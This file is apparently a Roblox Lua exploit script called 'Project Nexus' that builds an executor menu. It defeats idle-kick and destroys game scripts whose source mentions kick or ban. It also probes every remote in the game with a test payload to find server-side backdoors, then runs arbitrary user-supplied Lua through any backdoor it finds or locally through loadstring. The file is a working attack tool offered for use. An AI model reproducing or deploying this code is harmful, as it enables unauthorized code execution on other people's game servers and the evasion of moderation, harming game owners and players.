local Players = game:GetService("Players")
local player = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local VirtualUser = game:GetService("VirtualUser")
local StarterGui = game:GetService("StarterGui")

player.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

for _, v in pairs(game:GetDescendants()) do
    if v:IsA("Script") or v:IsA("LocalScript") then
        local success, source = pcall(function()
            return v.Source
        end)
        if success and source then
            if source:find("Kick") or source:find("Ban") or source:find("kick") or source:find("ban") then
                v:Destroy()
            end
        end
    end
end

local parent = CoreGui

local existingGui = parent:FindFirstChild("NexusMenu")
if existingGui then
    existingGui:Destroy()
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "NexusMenu"
ScreenGui.Parent = parent
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

_G.Nexus = _G.Nexus or {
    Execute = function(code)
        local func, err = loadstring(code)
        if func then
            local success, result = pcall(func)
            return success, result
        else
            return false, err
        end
    end,
    Injected = true,
    Backdoor = nil,
    UseBackdoor = false,
    FoundBackdoors = {},
    ServersWithBackdoor = {}
}

local Frame = Instance.new("Frame")
Frame.BorderSizePixel = 0
Frame.BackgroundColor3 = Color3.fromRGB(41, 41, 41)
Frame.Size = UDim2.new(0, 538, 0, 286)
Frame.Position = UDim2.new(0, 266, 0, -28)
Frame.Parent = ScreenGui

local FrameStroke = Instance.new("UIStroke")
FrameStroke.Color = Color3.fromRGB(255, 255, 255)
FrameStroke.Parent = Frame

local FrameStrokeGradient = Instance.new("UIGradient")
FrameStrokeGradient.Rotation = 50
FrameStrokeGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 255))
}
FrameStrokeGradient.Parent = FrameStroke

local Frame1 = Instance.new("Frame")
Frame1.Visible = false
Frame1.BorderSizePixel = 0
Frame1.BackgroundColor3 = Color3.fromRGB(41, 41, 41)
Frame1.Size = UDim2.new(0, 180, 0, 284)
Frame1.Position = UDim2.new(0, -170, 0, 0)
Frame1.Name = "Frame1"
Frame1.Parent = Frame

local UICorner_Frame1 = Instance.new("UICorner")
UICorner_Frame1.Parent = Frame1

local ConsoleButton = Instance.new("TextButton")
ConsoleButton.BorderSizePixel = 0
ConsoleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ConsoleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ConsoleButton.Size = UDim2.new(0, 178, 0, 34)
ConsoleButton.Text = "console"
ConsoleButton.Position = UDim2.new(0, 0, 0, 28)
ConsoleButton.Parent = Frame1

local UICorner_Console = Instance.new("UICorner")
UICorner_Console.Parent = ConsoleButton

local BackdoorsMenuButton = Instance.new("TextButton")
BackdoorsMenuButton.BorderSizePixel = 0
BackdoorsMenuButton.TextColor3 = Color3.fromRGB(255, 255, 255)
BackdoorsMenuButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BackdoorsMenuButton.Size = UDim2.new(0, 178, 0, 34)
BackdoorsMenuButton.Text = "Backdoors"
BackdoorsMenuButton.Position = UDim2.new(0, 0, 0, 64)
BackdoorsMenuButton.Parent = Frame1

local UICorner_BackdoorsMenu = Instance.new("UICorner")
UICorner_BackdoorsMenu.Parent = BackdoorsMenuButton

local NexusLabel = Instance.new("TextLabel")
NexusLabel.BorderSizePixel = 0
NexusLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NexusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
NexusLabel.BackgroundTransparency = 1
NexusLabel.Size = UDim2.new(0, 178, 0, 26)
NexusLabel.Text = "Nexus X menu"
NexusLabel.Parent = Frame1

local ExusLabel = Instance.new("TextLabel")
ExusLabel.BorderSizePixel = 0
ExusLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ExusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
ExusLabel.BackgroundTransparency = 1
ExusLabel.Size = UDim2.new(0.2, 0, 0.3, 0)
ExusLabel.Text = "exus"
ExusLabel.Name = "TextLabel5"
ExusLabel.Position = UDim2.new(0, 202, 0, -6)
ExusLabel.Parent = Frame

local ClearButton = Instance.new("TextButton")
ClearButton.BorderSizePixel = 0
ClearButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ClearButton.Size = UDim2.new(0, 110, 0, 26)
ClearButton.Text = "clear"
ClearButton.Name = "TextButton2"
ClearButton.Position = UDim2.new(0, 152, 0, 252)
ClearButton.Parent = Frame

local UICorner_Clear = Instance.new("UICorner")
UICorner_Clear.Parent = ClearButton

local ConnectButton = Instance.new("TextButton")
ConnectButton.BorderSizePixel = 0
ConnectButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ConnectButton.Size = UDim2.new(0, 110, 0, 26)
ConnectButton.Text = "connect"
ConnectButton.Name = "TextButton3"
ConnectButton.Position = UDim2.new(0, 274, 0, 252)
ConnectButton.Parent = Frame

local UICorner_Connect = Instance.new("UICorner")
UICorner_Connect.Parent = ConnectButton

local MenuButton = Instance.new("TextButton")
MenuButton.BorderSizePixel = 2
MenuButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MenuButton.BackgroundColor3 = Color3.fromRGB(41, 41, 41)
MenuButton.Size = UDim2.new(0, 46, 0, 44)
MenuButton.BorderColor3 = Color3.fromRGB(43, 43, 43)
MenuButton.Text = "="
MenuButton.Name = "TextButton4"
MenuButton.Position = UDim2.new(0, 12, 0, 4)
MenuButton.Parent = Frame

local BackdoorListFrame = Instance.new("Frame")
BackdoorListFrame.BorderSizePixel = 0
BackdoorListFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
BackdoorListFrame.Size = UDim2.new(0, 200, 0, 250)
BackdoorListFrame.Position = UDim2.new(0, -210, 0, 30)
BackdoorListFrame.Name = "BackdoorListFrame"
BackdoorListFrame.Visible = false
BackdoorListFrame.Parent = Frame

local UICorner_List = Instance.new("UICorner")
UICorner_List.CornerRadius = UDim.new(0, 10)
UICorner_List.Parent = BackdoorListFrame

local UIStroke_List = Instance.new("UIStroke")
UIStroke_List.Color = Color3.fromRGB(0, 255, 0)
UIStroke_List.Thickness = 2
UIStroke_List.Parent = BackdoorListFrame

local ListTitle = Instance.new("TextLabel")
ListTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ListTitle.BackgroundTransparency = 1
ListTitle.Size = UDim2.new(1, 0, 0, 25)
ListTitle.TextColor3 = Color3.fromRGB(0, 255, 0)
ListTitle.Text = "Found Backdoors"
ListTitle.TextScaled = true
ListTitle.Parent = BackdoorListFrame

local BackdoorScrollingFrame = Instance.new("ScrollingFrame")
BackdoorScrollingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
BackdoorScrollingFrame.Size = UDim2.new(1, -10, 1, -35)
BackdoorScrollingFrame.Position = UDim2.new(0, 5, 0, 30)
BackdoorScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
BackdoorScrollingFrame.ScrollBarThickness = 5
BackdoorScrollingFrame.Parent = BackdoorListFrame

local BackdoorListLayout = Instance.new("UIListLayout")
BackdoorListLayout.Parent = BackdoorScrollingFrame
BackdoorListLayout.Padding = UDim.new(0, 2)

local CloseListButton = Instance.new("TextButton")
CloseListButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseListButton.Size = UDim2.new(0, 20, 0, 20)
CloseListButton.Position = UDim2.new(1, -25, 0, 5)
CloseListButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseListButton.Text = "X"
CloseListButton.TextScaled = true
CloseListButton.BackgroundTransparency = 0.5
CloseListButton.Parent = BackdoorListFrame

local BackdoorInfoFrame = Instance.new("Frame")
BackdoorInfoFrame.BorderSizePixel = 0
BackdoorInfoFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
BackdoorInfoFrame.Size = UDim2.new(0, 350, 0, 280)
BackdoorInfoFrame.Position = UDim2.new(0, -360, 0, 30)
BackdoorInfoFrame.Name = "BackdoorInfoFrame"
BackdoorInfoFrame.Visible = false
BackdoorInfoFrame.Parent = Frame

local UICorner_Info = Instance.new("UICorner")
UICorner_Info.CornerRadius = UDim.new(0, 10)
UICorner_Info.Parent = BackdoorInfoFrame

local UIStroke_Info = Instance.new("UIStroke")
UIStroke_Info.Color = Color3.fromRGB(0, 255, 0)
UIStroke_Info.Thickness = 2
UIStroke_Info.Parent = BackdoorInfoFrame

local BackdoorNameLabel = Instance.new("TextLabel")
BackdoorNameLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BackdoorNameLabel.BackgroundTransparency = 1
BackdoorNameLabel.Size = UDim2.new(1, 0, 0, 30)
BackdoorNameLabel.Position = UDim2.new(0, 0, 0, 5)
BackdoorNameLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
BackdoorNameLabel.Text = "Backdoor Info"
BackdoorNameLabel.TextScaled = true
BackdoorNameLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
BackdoorNameLabel.Parent = BackdoorInfoFrame

local BackdoorPathLabel = Instance.new("TextLabel")
BackdoorPathLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BackdoorPathLabel.BackgroundTransparency = 1
BackdoorPathLabel.Size = UDim2.new(1, -20, 0, 40)
BackdoorPathLabel.Position = UDim2.new(0, 10, 0, 40)
BackdoorPathLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
BackdoorPathLabel.Text = "Path: "
BackdoorPathLabel.TextWrapped = true
BackdoorPathLabel.TextXAlignment = Enum.TextXAlignment.Left
BackdoorPathLabel.TextYAlignment = Enum.TextYAlignment.Top
BackdoorPathLabel.Parent = BackdoorInfoFrame

local BackdoorTypeLabel = Instance.new("TextLabel")
BackdoorTypeLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BackdoorTypeLabel.BackgroundTransparency = 1
BackdoorTypeLabel.Size = UDim2.new(1, -20, 0, 20)
BackdoorTypeLabel.Position = UDim2.new(0, 10, 0, 85)
BackdoorTypeLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
BackdoorTypeLabel.Text = "Type: "
BackdoorTypeLabel.TextXAlignment = Enum.TextXAlignment.Left
BackdoorTypeLabel.Parent = BackdoorInfoFrame

local BackdoorIDLabel = Instance.new("TextLabel")
BackdoorIDLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BackdoorIDLabel.BackgroundTransparency = 1
BackdoorIDLabel.Size = UDim2.new(1, -20, 0, 20)
BackdoorIDLabel.Position = UDim2.new(0, 10, 0, 110)
BackdoorIDLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
BackdoorIDLabel.Text = "Asset ID: "
BackdoorIDLabel.TextXAlignment = Enum.TextXAlignment.Left
BackdoorIDLabel.Parent = BackdoorInfoFrame

local BackdoorHowToLabel = Instance.new("TextLabel")
BackdoorHowToLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BackdoorHowToLabel.BackgroundTransparency = 1
BackdoorHowToLabel.Size = UDim2.new(1, -20, 0, 40)
BackdoorHowToLabel.Position = UDim2.new(0, 10, 0, 135)
BackdoorHowToLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
BackdoorHowToLabel.Text = "How it works: "
BackdoorHowToLabel.TextWrapped = true
BackdoorHowToLabel.TextXAlignment = Enum.TextXAlignment.Left
BackdoorHowToLabel.TextYAlignment = Enum.TextYAlignment.Top
BackdoorHowToLabel.Parent = BackdoorInfoFrame

local UseButton = Instance.new("TextButton")
UseButton.BorderSizePixel = 0
UseButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
UseButton.Size = UDim2.new(0, 100, 0, 35)
UseButton.Position = UDim2.new(0, 20, 1, -45)
UseButton.TextColor3 = Color3.fromRGB(0, 0, 0)
UseButton.Text = "USE"
UseButton.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UseButton.Parent = BackdoorInfoFrame

local UICorner_Use = Instance.new("UICorner")
UICorner_Use.CornerRadius = UDim.new(0, 5)
UICorner_Use.Parent = UseButton

local CloseInfoButton = Instance.new("TextButton")
CloseInfoButton.BorderSizePixel = 0
CloseInfoButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseInfoButton.Size = UDim2.new(0, 100, 0, 35)
CloseInfoButton.Position = UDim2.new(1, -120, 1, -45)
CloseInfoButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseInfoButton.Text = "CLOSE"
CloseInfoButton.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
CloseInfoButton.Parent = BackdoorInfoFrame

local UICorner_Close = Instance.new("UICorner")
UICorner_Close.CornerRadius = UDim.new(0, 5)
UICorner_Close.Parent = CloseInfoButton

local HelpFrame = Instance.new("Frame")
HelpFrame.BorderSizePixel = 0
HelpFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HelpFrame.Size = UDim2.new(0, 170, 0, 278)
HelpFrame.Position = UDim2.new(0, 366, 0, 4)
HelpFrame.Name = "helpuigradientinterfaceframe"
HelpFrame.Parent = Frame

local UICorner_Help = Instance.new("UICorner")
UICorner_Help.Parent = HelpFrame

local UIGradient_Help = Instance.new("UIGradient")
UIGradient_Help.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(6, 6, 6)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(41, 41, 41))
}
UIGradient_Help.Parent = HelpFrame

local ScanStatusLabel = Instance.new("TextLabel")
ScanStatusLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScanStatusLabel.BackgroundTransparency = 1
ScanStatusLabel.Size = UDim2.new(1, 0, 0, 30)
ScanStatusLabel.Position = UDim2.new(0, 0, 0, 10)
ScanStatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanStatusLabel.Text = "Scanning for backdoors..."
ScanStatusLabel.TextScaled = true
ScanStatusLabel.Parent = HelpFrame

local ScanProgressLabel = Instance.new("TextLabel")
ScanProgressLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScanProgressLabel.BackgroundTransparency = 1
ScanProgressLabel.Size = UDim2.new(1, 0, 0, 20)
ScanProgressLabel.Position = UDim2.new(0, 0, 0, 45)
ScanProgressLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
ScanProgressLabel.Text = "Checking..."
ScanProgressLabel.TextScaled = true
ScanProgressLabel.Parent = HelpFrame

local UICorner_Main = Instance.new("UICorner")
UICorner_Main.CornerRadius = UDim.new(0, 15)
UICorner_Main.Parent = Frame

local RedXLabel = Instance.new("TextLabel")
RedXLabel.BorderSizePixel = 0
RedXLabel.TextSize = 15
RedXLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RedXLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
RedXLabel.BackgroundTransparency = 1
RedXLabel.Size = UDim2.new(0.2, 0, 0.3, 0)
RedXLabel.Text = "X"
RedXLabel.Name = "TextLabel4"
RedXLabel.Position = UDim2.new(0, 206, 0, -26)
RedXLabel.Parent = Frame

local UIGradient_Main = Instance.new("UIGradient")
UIGradient_Main.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(0.500, Color3.fromRGB(41, 41, 41)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(41, 41, 41))
}
UIGradient_Main.Parent = Frame

local RedXLabel2 = Instance.new("TextLabel")
RedXLabel2.BorderSizePixel = 0
RedXLabel2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RedXLabel2.TextColor3 = Color3.fromRGB(255, 0, 0)
RedXLabel2.BackgroundTransparency = 1
RedXLabel2.Size = UDim2.new(0.2, 0, 0.3, 0)
RedXLabel2.Text = "X"
RedXLabel2.Name = "TextLabel2"
RedXLabel2.Position = UDim2.new(0, 110, 0, -24)
RedXLabel2.Parent = Frame

local ProjectNexusLabel = Instance.new("TextLabel")
ProjectNexusLabel.BorderSizePixel = 0
ProjectNexusLabel.TextXAlignment = Enum.TextXAlignment.Left
ProjectNexusLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ProjectNexusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectNexusLabel.BackgroundTransparency = 1
ProjectNexusLabel.Size = UDim2.new(0, 242, 0, 30)
ProjectNexusLabel.Text = "Project Nexus"
ProjectNexusLabel.Position = UDim2.new(0, 88, 0, 4)
ProjectNexusLabel.Parent = Frame

local TextBox = Instance.new("TextBox")
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.BorderSizePixel = 0
TextBox.TextWrapped = true
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextYAlignment = Enum.TextYAlignment.Top
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.Size = UDim2.new(0, 430, 0, 148)
TextBox.Position = UDim2.new(0, 14, 0, 50)
TextBox.Text = [[print("hello robloxians!")]]
TextBox.BackgroundTransparency = 1
TextBox.Parent = Frame

local UIDragDetector = Instance.new("UIDragDetector")
UIDragDetector.DragUDim2 = UDim2.new(0, 82, 0, -8)
UIDragDetector.Parent = Frame

local BigNLabel = Instance.new("TextLabel")
BigNLabel.BorderSizePixel = 0
BigNLabel.TextSize = 30
BigNLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BigNLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
BigNLabel.BackgroundTransparency = 1
BigNLabel.Size = UDim2.new(0.2, 0, 0.3, 0)
BigNLabel.Text = "N"
BigNLabel.Name = "TextLabel3"
BigNLabel.Position = UDim2.new(0, 176, 0, -16)
BigNLabel.Parent = Frame

local ExecuteButton = Instance.new("TextButton")
ExecuteButton.BorderSizePixel = 0
ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExecuteButton.Size = UDim2.new(0, 106, 0, 26)
ExecuteButton.Text = "execute"
ExecuteButton.Position = UDim2.new(0, 38, 0, 252)
ExecuteButton.Parent = Frame

local UICorner_Execute = Instance.new("UICorner")
UICorner_Execute.Parent = ExecuteButton

local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
local scanning = false
local currentInfoBackdoor = nil

local function notify(text)
    StarterGui:SetCore("SendNotification", {
        Title = "Nexus",
        Text = text,
        Duration = 3
    })
end

local function generateName(length)
    local text = ''
    for i = 1, length do
        text = text .. alphabet[math.random(1, #alphabet)]
    end
    return text
end

local function runRemote(remote, data)
    if remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote:IsA('RemoteFunction') then
        task.spawn(function() 
            pcall(function()
                remote:InvokeServer(data)
            end)
        end)
    end
end

local function showBackdoorInfo(remote)
    if not remote then return end
    
    currentInfoBackdoor = remote
    
    BackdoorNameLabel.Text = remote.Name
    BackdoorPathLabel.Text = "Path: " .. remote:GetFullName()
    BackdoorTypeLabel.Text = "Type: " .. remote.ClassName
    BackdoorIDLabel.Text = "Asset ID: N/A (RemoteEvent)"
    BackdoorHowToLabel.Text = "How it works:\nStandard RemoteEvent backdoor\nUse: remote:FireServer(code)"
    
    if _G.Nexus.UseBackdoor and _G.Nexus.Backdoor == remote then
        UseButton.Text = "UNUSE"
        UseButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
    else
        UseButton.Text = "USE"
        UseButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    end
    
    BackdoorInfoFrame.Visible = true
end

local function scanForBackdoors()
    if scanning then return end
    scanning = true
    
    ScanStatusLabel.Text = "Scanning..."
    ScanProgressLabel.Text = "Checking remotes..."
    
    for _, child in ipairs(BackdoorScrollingFrame:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
    _G.Nexus.FoundBackdoors = {}
    
    local remotes = {}
    local foundBackdoors = {}
    
    local protected = game:GetService('ReplicatedStorage'):FindFirstChild('lh' .. game.PlaceId / 6666 * 1337 * game.PlaceId)
    if protected and (protected:IsA('RemoteEvent') or protected:IsA('RemoteFunction')) then
        local code = generateName(15)
        task.spawn(function() 
            pcall(function()
                if protected:IsA('RemoteFunction') then
                    protected:InvokeServer('nexus', "a=Instance.new('Model',workspace);a.Name='" .. code .. "'")
                else
                    protected:FireServer('nexus', "a=Instance.new('Model',workspace);a.Name='" .. code .. "'")
                end
            end)
        end)
        remotes[code] = protected
    end
    
    for _, remote in ipairs(game:GetDescendants()) do
        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then
            continue
        end
        
        local fullName = remote:GetFullName()
        if fullName:find('RobloxReplicatedStorage') or 
           fullName:find('__FUNCTION') or
           fullName:find('DefaultChatSystem') then
            continue
        end
        
        local code = generateName(15)
        runRemote(remote, "a=Instance.new('Model',workspace);a.Name='" .. code .. "'")
        remotes[code] = remote
        
        RunService.Heartbeat:Wait()
    end
    
    ScanProgressLabel.Text = "Checking results..."
    
    for i = 1, 30 do
        for testCode, remote in pairs(remotes) do
            local model = workspace:FindFirstChild(testCode)
            if model then
                model:Destroy()
                
                if not foundBackdoors[remote] then
                    foundBackdoors[remote] = remote
                    _G.Nexus.FoundBackdoors[remote] = remote
                    
                    local backdoorButton = Instance.new("TextButton")
                    backdoorButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
                    backdoorButton.Size = UDim2.new(1, 0, 0, 30)
                    backdoorButton.Text = remote.Name .. " (" .. remote.ClassName .. ")"
                    backdoorButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                    backdoorButton.TextScaled = true
                    backdoorButton.Parent = BackdoorScrollingFrame
                    
                    backdoorButton.MouseButton1Click:Connect(function()
                        showBackdoorInfo(remote)
                    end)
                end
            end
        end
        RunService.Heartbeat:Wait()
    end
    
    local totalHeight = 0
    for _, child in ipairs(BackdoorScrollingFrame:GetChildren()) do
        if child:IsA("TextButton") then
            totalHeight = totalHeight + 32
        end
    end
    BackdoorScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, totalHeight)
    
    local foundCount = 0
    for _ in pairs(foundBackdoors) do
        foundCount = foundCount + 1
    end
    
    if foundCount > 0 then
        ScanStatusLabel.Text = "Found " .. foundCount .. " backdoor(s)"
        ScanProgressLabel.Text = "Click = then Backdoors"
        notify("Found " .. foundCount .. " backdoors")
    else
        ScanStatusLabel.Text = "No backdoors found"
        ScanProgressLabel.Text = "Try another game"
    end
    
    scanning = false
end

ConsoleButton.MouseButton1Click:Connect(function()
    StarterGui:SetCore("DevConsoleVisible", true)
end)

ClearButton.MouseButton1Click:Connect(function()
    TextBox.Text = ""
    
    local oldColor = ClearButton.BackgroundColor3
    ClearButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ClearButton.TextColor3 = Color3.fromRGB(0, 0, 0)
    
    task.wait(0.1)
    ClearButton.BackgroundColor3 = oldColor
    ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
end)

ConnectButton.MouseButton1Click:Connect(function()
    ConnectButton.Text = "connecting"
    ConnectButton.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
    
    _G.Nexus.Injected = true
    ConnectButton.Text = "connected"
    ConnectButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    
    task.wait(1)
    ConnectButton.Text = "connect"
    ConnectButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
end)

local isOpen = false
local isAnimating = false

local function slideInFromRight(frame, duration)
    duration = duration or 0.4
    isAnimating = true
    
    local originalPos = frame.Position
    frame.Position = UDim2.new(1.3, 0, originalPos.Y.Scale, originalPos.Y.Offset)
    frame.Visible = true
    
    local tween = TweenService:Create(
        frame,
        TweenInfo.new(duration, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        {Position = originalPos}
    )
    
    tween:Play()
    tween.Completed:Connect(function()
        isAnimating = false
        isOpen = true
    end)
end

local function slideOutToLeft(frame, duration)
    duration = duration or 0.3
    isAnimating = true
    
    local tween = TweenService:Create(
        frame,
        TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
        {Position = UDim2.new(-1.3, 0, frame.Position.Y.Scale, frame.Position.Y.Offset)}
    )
    
    tween:Play()
    tween.Completed:Connect(function()
        frame.Visible = false
        isAnimating = false
        isOpen = false
        frame.Position = UDim2.new(-0.3, 0, frame.Position.Y.Scale, frame.Position.Y.Offset)
    end)
end

MenuButton.MouseButton1Click:Connect(function()
    if not isAnimating then
        if not isOpen then
            slideInFromRight(Frame1, 0.5)
        else
            slideOutToLeft(Frame1, 0.3)
            BackdoorListFrame.Visible = false
            BackdoorInfoFrame.Visible = false
        end
    end
end)

BackdoorsMenuButton.MouseButton1Click:Connect(function()
    if BackdoorListFrame.Visible then
        BackdoorListFrame.Visible = false
        BackdoorInfoFrame.Visible = false
    else
        BackdoorListFrame.Visible = true
        BackdoorInfoFrame.Visible = false
    end
end)

CloseListButton.MouseButton1Click:Connect(function()
    BackdoorListFrame.Visible = false
    BackdoorInfoFrame.Visible = false
end)

CloseInfoButton.MouseButton1Click:Connect(function()
    BackdoorInfoFrame.Visible = false
end)

UseButton.MouseButton1Click:Connect(function()
    if not currentInfoBackdoor then return end
    
    if UseButton.Text == "USE" then
        _G.Nexus.Backdoor = currentInfoBackdoor
        _G.Nexus.UseBackdoor = true
        UseButton.Text = "UNUSE"
        UseButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
        notify("Using: " .. currentInfoBackdoor.Name)
    else
        _G.Nexus.Backdoor = nil
        _G.Nexus.UseBackdoor = false
        UseButton.Text = "USE"
        UseButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        notify("Backdoor disabled")
    end
end)

ExecuteButton.MouseButton1Click:Connect(function()
    local code = TextBox.Text
    if code == "" then
        code = 'print("Hello from Nexus!")'
    end
    
    code = string.gsub(code, '%%username%%', player.Name)
    code = string.gsub(code, '%%userid%%', tostring(player.UserId))
    code = string.gsub(code, '%%placeid%%', tostring(game.PlaceId))
    
    local oldText = ExecuteButton.Text
    local oldColor = ExecuteButton.TextColor3
    
    ExecuteButton.Text = "▶"
    ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 0)
    
    if _G.Nexus.UseBackdoor and _G.Nexus.Backdoor then
        runRemote(_G.Nexus.Backdoor, code)
        ExecuteButton.Text = "✅"
        ExecuteButton.TextColor3 = Color3.fromRGB(0, 255, 0)
    else
        local success = pcall(function()
            loadstring(code)()
        end)
        
        if success then
            ExecuteButton.Text = "✅"
            ExecuteButton.TextColor3 = Color3.fromRGB(0, 255, 0)
        else
            ExecuteButton.Text = "❌"
            ExecuteButton.TextColor3 = Color3.fromRGB(255, 0, 0)
        end
    end
    
    task.wait(0.8)
    ExecuteButton.Text = oldText
    ExecuteButton.TextColor3 = oldColor
end)

local function dragify(frame)
    local dragging = false
    local dragInput
    local dragStart
    local startPos
    
    frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            TweenService:Create(frame, TweenInfo.new(0.15), {
                Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            }):Play()
        end
    end)
end

dragify(Frame)

UserInputService.InputBegan:Connect(function(input, processed)
    if input.KeyCode == Enum.KeyCode.LeftAlt and not processed then
        ScreenGui.Enabled = not ScreenGui.Enabled
    end
end)

task.spawn(function()
    task.wait(1)
    scanForBackdoors()
end)

print("Nexus loaded - Press LeftAlt")